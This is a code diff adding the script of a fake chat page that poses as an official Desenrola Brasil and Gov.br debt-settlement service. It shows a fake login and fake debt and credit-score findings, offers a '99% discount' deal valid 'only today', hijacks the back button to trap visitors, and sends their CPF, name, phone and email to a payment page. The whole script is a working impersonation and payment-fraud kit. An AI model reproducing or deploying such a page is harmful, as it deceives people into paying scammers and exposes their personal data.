+var PHONE='11988887777',EMAIL='cliente@desenrola.br',VALOR='R$ 68,92',CODIGO_ACORDO='';
+var currentAudio=null;
+
+function codeFromCPF(cpf){
+  var d=String(cpf||'').replace(/\D/g,''),h=5381;
+  for(var i=0;i<d.length;i++)h=(h*33+d.charCodeAt(i))>>>0;
+  var s=h.toString(36).toUpperCase().padStart(8,'X');
+  return(s.slice(0,5)+'-'+s.slice(5,9)+'-'+s.slice(9,13)+'-'+s.slice(13,17)).slice(0,17);
+}
+function tag(t){
+  return(t||'').replace(/\{NOME\}/g,NOME).replace(/\{NOME_COMPLETO\}/g,NOME_COMPLETO)
+    .replace(/\{CPF\}/g,CPF).replace(/\{CPF_FORMATADO\}/g,CPF_FORMATADO)
+    .replace(/\{NASC\}/g,NASC).replace(/\{CODIGO_ACORDO\}/g,CODIGO_ACORDO).replace(/\{VALOR\}/g,VALOR);
+}
+function formatData(data){if(!data||data.length<10)return data;var m=String(data).match(/(\d{4})-(\d{2})-(\d{2})/);return m?m[3]+'/'+m[2]+'/'+m[1]:data}
+
+var msgs=document.getElementById('msgs');
+var scroll=function(){setTimeout(function(){msgs.scrollTop=msgs.scrollHeight},60)};
+var sleep=function(ms){return new Promise(function(r){setTimeout(r,ms)})};
+
+function addTyping(){removeTyping();var row=document.createElement('div');row.className='msg-row';row.id='typing-row';row.innerHTML='<img class="avatar" src="'+AVATAR+'"><div class="typing"><span></span><span></span><span></span></div>';msgs.appendChild(row);scroll()}
+function removeTyping(){var el=document.getElementById('typing-row');if(el)el.remove()}
+function botRow(inner){var row=document.createElement('div');row.className='msg-row';row.innerHTML='<img class="avatar" src="'+AVATAR+'">'+inner;msgs.appendChild(row);scroll();return row}
+function addUser(text){var row=document.createElement('div');row.className='msg-row user';row.innerHTML='<div class="bubble-user">'+text+'</div>';msgs.appendChild(row);scroll()}
+function addSystem(text){var row=document.createElement('div');row.className='msg-row';row.innerHTML='<div style="width:30px;margin-right:7px;flex-shrink:0"></div><div class="bubble-system">'+tag(text)+'</div>';msgs.appendChild(row);scroll()}
+function addImage(src){var row=document.createElement('div');row.className='msg-row';row.innerHTML='<img class="avatar" src="'+AVATAR+'"><div style="flex:1"><img src="'+src+'" style="max-width:100%;border-radius:8px;margin-top:8px"></div>';msgs.appendChild(row);scroll()}
+
+function addVideoAutoplay(src){
+  var row=document.createElement('div');row.className='msg-row';
+  var vc=document.createElement('div');vc.style.cssText='flex:1;position:relative;display:inline-block;width:100%';
+  var video=document.createElement('video');video.src=src;video.height='400';video.autoplay=true;video.playsinline=true;
+  video.style.cssText='border-radius:8px;margin-top:8px;width:auto;max-width:100%;display:block';
+  video.setAttribute('playsinline','');video.setAttribute('webkit-playsinline','');
+  var controls=document.createElement('div');controls.style.cssText='position:absolute;bottom:10px;left:10px;display:flex;gap:10px;z-index:10';
+  var ppBtn=document.createElement('button');ppBtn.style.cssText='width:52px;height:52px;border-radius:50%;background:#1351B4;border:none;cursor:pointer;display:flex;align-items:center;justify-content:center;font-size:0;color:#fff;box-shadow:0 2px 8px rgba(0,0,0,0.2)';
+  var pauseSvg='<svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="6" y="4" width="4" height="16"></rect><rect x="14" y="4" width="4" height="16"></rect></svg>';
+  var playSvg='<svg width="28" height="28" viewBox="0 0 24 24" fill="currentColor"><polygon points="5 3 19 12 5 21 5 3"></polygon></svg>';
+  var isP=false;ppBtn.innerHTML=playSvg;
+  function tryPlay(){var p=video.play();if(p!==undefined)p.then(function(){isP=true;ppBtn.innerHTML=pauseSvg}).catch(function(){isP=false;ppBtn.innerHTML=playSvg})}
+  setTimeout(tryPlay,1000);
+  ppBtn.onclick=function(e){e.stopPropagation();if(isP){video.pause();ppBtn.innerHTML=playSvg;isP=false}else tryPlay()};
+  vc.onclick=function(e){if(!isP)tryPlay()};
+  controls.appendChild(ppBtn);vc.appendChild(video);vc.appendChild(controls);
+  row.innerHTML='<img class="avatar" src="'+AVATAR+'">';row.appendChild(vc);msgs.appendChild(row);scroll();
+}
+
+function addAudio(src){
+  var row=document.createElement('div');row.className='msg-row';
+  if(currentAudio){try{currentAudio.pause();currentAudio.src='';currentAudio.load()}catch(e){}}
+  var audio=document.createElement('audio');audio.src=src;audio.preload='auto';audio.autoplay=true;audio.controls=false;currentAudio=audio;
+  var audioDiv=document.createElement('div');audioDiv.style.cssText='background:#fff;border-radius:18px 18px 18px 4px;padding:11px 15px;width:280px;display:flex;align-items:center;gap:12px;border:1px solid #e5e5e5;box-shadow:0 2px 6px rgba(0,0,0,.07)';
+  var playBtn=document.createElement('button');playBtn.style.cssText='width:52px;height:52px;border-radius:50%;background:#1351B4;border:none;cursor:pointer;display:flex;align-items:center;justify-content:center;flex-shrink:0;color:#fff;font-size:0;box-shadow:0 2px 8px rgba(0,0,0,0.2)';
+  var aSvgPlay='<svg width="28" height="28" viewBox="0 0 24 24" fill="currentColor"><polygon points="5 3 19 12 5 21 5 3"></polygon></svg>';
+  var aSvgPause='<svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="6" y="4" width="4" height="16"></rect><rect x="14" y="4" width="4" height="16"></rect></svg>';
+  playBtn.innerHTML=aSvgPause;
+  var contentDiv=document.createElement('div');contentDiv.style.cssText='flex:1;display:flex;flex-direction:column;gap:6px';
+  var progressBar=document.createElement('div');progressBar.style.cssText='height:4px;background:#D3D3D3;border-radius:2px;cursor:pointer;width:100%;position:relative';
+  var progressFill=document.createElement('div');progressFill.style.cssText='height:100%;background:#1351B4;border-radius:2px;width:0%';progressBar.appendChild(progressFill);
+  var timeDiv=document.createElement('div');timeDiv.style.cssText='font-size:13px;color:#666;font-weight:500';timeDiv.textContent='0:00 / 0:00';
+  var isP=true;
+  setTimeout(function(){var p=audio.play();if(p)p.catch(function(){})},200);
+  playBtn.onclick=function(){if(isP){audio.pause();playBtn.innerHTML=aSvgPlay;isP=false}else{audio.play();playBtn.innerHTML=aSvgPause;isP=true}};
+  audio.onended=function(){playBtn.innerHTML=aSvgPlay;isP=false;progressFill.style.width='0%'};
+  audio.onloadedmetadata=function(){var mins=Math.floor(audio.duration/60),secs=Math.floor(audio.duration%60);timeDiv.textContent='0:00 / '+mins+':'+(secs<10?'0':'')+secs};
+  audio.ontimeupdate=function(){progressFill.style.width=(audio.currentTime/audio.duration*100)+'%';var cm=Math.floor(audio.currentTime/60),cs=Math.floor(audio.currentTime%60),tm=Math.floor(audio.duration/60),ts=Math.floor(audio.duration%60);timeDiv.textContent=cm+':'+(cs<10?'0':'')+cs+' / '+tm+':'+(ts<10?'0':'')+ts};
+  progressBar.onclick=function(e){var rect=progressBar.getBoundingClientRect();audio.currentTime=(e.clientX-rect.left)/rect.width*audio.duration};
+  contentDiv.appendChild(progressBar);contentDiv.appendChild(timeDiv);audioDiv.appendChild(playBtn);audioDiv.appendChild(contentDiv);
+  row.innerHTML='<img class="avatar" src="'+AVATAR+'">';var wrapper=document.createElement('div');wrapper.style.flex='1';wrapper.appendChild(audioDiv);row.appendChild(wrapper);msgs.appendChild(row);scroll();
+}
+
+function addAudioThen(audioSrc,onAction){
+  addAudio(audioSrc);
+  return new Promise(function(resolve){
+    var audio=currentAudio,done=false,ci=null;
+    function setup(){
+      var dur=audio.duration;if(dur&&dur>0){var at=Math.max(0,dur-3);
+      ci=setInterval(function(){if(audio.currentTime>=at&&!done){done=true;clearInterval(ci);onAction().then(resolve).catch(resolve)}},100);
+      audio.onended=function(){if(ci)clearInterval(ci);if(!done){done=true;onAction().then(resolve).catch(resolve)}}}
+    }
+    if(audio.readyState>=1)setup();else audio.onloadedmetadata=setup;
+    setTimeout(function(){if(!done){done=true;if(ci)clearInterval(ci);onAction().then(resolve).catch(resolve)}},120000);
+  });
+}
+function addAudioWithButton(audioSrc,buttonText){return addAudioThen(audioSrc,function(){return addButtons([buttonText],false,true,true)})}
+
+function infoCard(lines){
+  var html='<div class="bubble-info-card">';
+  lines.forEach(function(l){html+='<div class="'+({label:'ic-label',value:'ic-value',bold:'ic-bold'}[l.style]||'ic-label')+'">'+tag(l.text)+'</div>'});
+  html+='</div>';botRow(html);
+}
+
+function addButtons(options,wide,solid,right){
+  return new Promise(function(resolve){
+    var wrap=document.createElement('div');wrap.style.marginBottom='8px';
+    if(right){wrap.style.display='flex';wrap.style.justifyContent='flex-end'}else wrap.style.marginLeft='37px';
+    var row=document.createElement('div');row.className=wide?'btn-row':'btn-row row-inline';
+    options.forEach(function(opt){
+      var btn=document.createElement('button');btn.className='chat-btn'+(wide?' wide solid':'')+((!wide&&solid)?' solid':'');
+      btn.textContent=opt;btn.onclick=function(){wrap.remove();addUser(opt);resolve(opt)};row.appendChild(btn);
+    });
+    wrap.appendChild(row);msgs.appendChild(wrap);scroll();
+  });
+}
+
+async function botSay(html){addTyping();await sleep(1200);removeTyping();botRow('<div class="bubble-bot">'+tag(html)+'</div>');await sleep(900)}
+
+function startChat(){
+  CODIGO_ACORDO=codeFromCPF(CPF);
+  try{var el=document.getElementById('nomeUsuario');if(el)el.textContent=NOME.split(' ')[0]||'Usuário'}catch(_){}
+
+  // Back-button interception
+  var bk=0;history.pushState({_br:1},'');
+  window.addEventListener('popstate',function(){bk++;document.getElementById(bk===1?'br1':'br2').classList.add('on');history.pushState({_br:1},'')});
+
+  setTimeout(startFlow,400);
+}
+
+async function startFlow(){
+  addImage('images/image1.png');
+  await botSay('Olá {NOME_COMPLETO}, esse é um canal oficial de atendimento do <strong>Desenrola Brasil</strong> e os seus dados estão seguros conosco. 🔒');
+  await botSay('Aguarde em alguns instantes, um de nossos atendentes entrará na conversa..');
+  addVideoAutoplay('media/video15.mp4');
+  addSystem('<em><strong>(Atendente Letícia entrou na conversa..)</strong></em> 💬');
+  addTyping();await sleep(17000);removeTyping();
+
+  var confirmWrap=document.createElement('div');confirmWrap.style.marginLeft='37px';confirmWrap.style.marginBottom='8px';
+  var cCard=document.createElement('div');cCard.className='confirm-card';
+  cCard.innerHTML='<span class="confirm-title">Para continuar, confirme seus dados:</span><strong>Nome:</strong><span>'+NOME_COMPLETO+'</span><strong>CPF:</strong><span>'+CPF_FORMATADO+'</span>'+(NASC?'<strong>Data de Nascimento:</strong><span>'+formatData(NASC)+'</span>':'');
+  var btnsC=document.createElement('div');btnsC.className='confirm-btns';
+  ['Sim, está correto.','Não sou eu'].forEach(function(label){
+    var btn=document.createElement('button');btn.className='chat-btn'+(label.indexOf('Sim')===0?' solid':'');btn.textContent=label;
+    btn.onclick=function(){btnsC.remove();addUser(label);
+      if(label.indexOf('Sim')===0)continueFlow();
+      else setTimeout(async function(){await botSay('Por favor, acesse o site com o seu CPF para prosseguir.');setTimeout(function(){goToStep('entrar')},1500)},600);
+    };btnsC.appendChild(btn);
+  });
+  confirmWrap.appendChild(cCard);confirmWrap.appendChild(btnsC);msgs.appendChild(confirmWrap);scroll();
+}
+
+async function continueFlow(){
+  await sleep(500);
+  await botSay('Obrigada!');
+  await botSay('Aguarde... Entrando em sua conta Gov.br');
+  await botSay('<strong>Login efetuado com sucesso!</strong>');
+  await botSay('<strong>{NOME_COMPLETO}</strong><br>Seja bem vindo(a) a sua conta Gov.br');
+  await botSay('Negocie dívidas com as seguintes empresas:');
+  addImage('images/image2.png');
+  await addButtons(['CONTINUAR'],false,true,true);
+  await addAudioWithButton('media/Desktop2026.mp3','SIM! QUERO NEGOCIAR');
+  await botSay('<em>Por favor, aguarde analisarmos a situação do seu CPF em nosso sistema..</em>');
+  await sleep(3000);await botSay('<em>Consultando..</em>');await sleep(3000);
+  await botSay('<strong>Análise concluída!</strong>');await sleep(3000);
+  await botSay('Identificamos <strong>4 dívidas ativas</strong> no sistema. Os valores variam entre <strong>R$ 1.728,74 a R$ 5.278,23</strong> de dívida <strong>em seu CPF.</strong>');
+  await sleep(3000);
+  infoCard([{text:'Situação para CPF:',style:'label'},{text:'{CPF_FORMATADO}',style:'value'},{text:'NEGATIVADO.',style:'bold'}]);
+  await botSay('Segundo nossos registros, seu SCORE é considerado muito baixo <strong>(alto risco para crédito):</strong>');
+  addImage('images/score.jpg');
+  await botSay('Você deseja verificar se existe algum acordo com desconto disponível para você?');
+  await addButtons(['BUSCAR ACORDO'],false,true,true);
+  await botSay('<em>Por favor, aguarde enquanto nosso sistema verifica se existem acordos disponíveis para você...</em>');
+  await botSay('<strong>Acordo encontrado!</strong>');
+  infoCard([{text:'1 (um) acordo foi encontrado para:',style:'bold'},{text:'{NOME_COMPLETO}',style:'value'},{text:'CPF: {CPF_FORMATADO}',style:'value'}]);
+  await addButtons(['VER ACORDO'],false,true,true);
+  await addAudioThen('media/buscaacordo.mp3',async function(){
+    await botSay('Parabéns <strong>{NOME_COMPLETO}!</strong><br><br>Pode comemorar! Encontramos um <strong>SUPER ACORDO DE 99% DE DESCONTO</strong> para você!');return Promise.resolve();
+  });
+  await botSay('<em>Acessando o acordo <strong>{CODIGO_ACORDO}</strong>...</em>');
+  await botSay('Informações do acordo <strong><em>{CODIGO_ACORDO}</em></strong> para ({NOME_COMPLETO})<br><br>(CPF: {CPF_FORMATADO})');
+  await botSay('O contrato atual é válido apenas para o titular: <strong>{NOME_COMPLETO}</strong> portador(a) do CPF: <strong>{CPF_FORMATADO}</strong>');
+  await botSay('Você gostaria de realizar o seu acordo com <strong>99% DE DESCONTO</strong> para quitar <strong>todas</strong> as suas dívidas e ter seu nome limpo novamente por apenas <strong>{VALOR}</strong>?');
+  await addButtons(['CONFIRMAR O ACORDO E LIMPAR O NOME'],false,true,true);
+  await addAudioThen('media/parabens.mp3',async function(){
+    await botSay('<strong>Acordo confirmado com sucesso!</strong>');return await addButtons(['CONTINUAR'],false,true,true);
+  });
+  await addAudioThen('media/pagamento.mp3',async function(){
+    infoCard([{text:'Acordo confirmado: {CODIGO_ACORDO}!',style:'label'},{text:'Beneficiário(a):',style:'label'},{text:'{NOME_COMPLETO}',style:'bold'},{text:'Identificação (CPF):',style:'label'},{text:'{CPF_FORMATADO}',style:'bold'},{text:'Quitação de todas as dívidas em ativo no CPF.',style:'value'},{text:'895 Pontos no score.',style:'bold'},{text:'Valor da proposta: {VALOR}',style:'label'}]);
+    return await addButtons(['CONTINUAR PARA O PAGAMENTO'],false,true,true);
+  });
+  await addAudioThen('media/aviso.mp3',async function(){
+    await botSay('<strong><em>Atenção!</em></strong> <em>Oferta Válida Apenas para hoje.</em>');
+    return await botSay('<em>Clique no botão abaixo para acessar a próxima tela e realizar seu pagamento</em>');
+  });
+  await sleep(600);
+  var nextP=new URLSearchParams();
+  nextP.set('cpf',CPF);nextP.set('nome',NOME_COMPLETO);nextP.set('phone',PHONE);nextP.set('email',EMAIL);nextP.set('valor',VALOR);nextP.set('acordo',CODIGO_ACORDO);
+  KEYS.forEach(function(k){if(P[k]&&!nextP.has(k))nextP.set(k,P[k])});
+  var qs='?'+nextP.toString();
+  var finRow=document.createElement('div');finRow.style.marginLeft='37px';finRow.style.marginBottom='8px';
+  var finA=document.createElement('a');finA.href='../pagamento/'+qs;finA.className='btn-link-final';finA.textContent='REALIZAR PAGAMENTO DO ACORDO E LIMPAR MEU NOME';
+  finRow.appendChild(finA);msgs.appendChild(finRow);scroll();
+}
+
+})();
+</script>
+
+</body>
+</html>
+
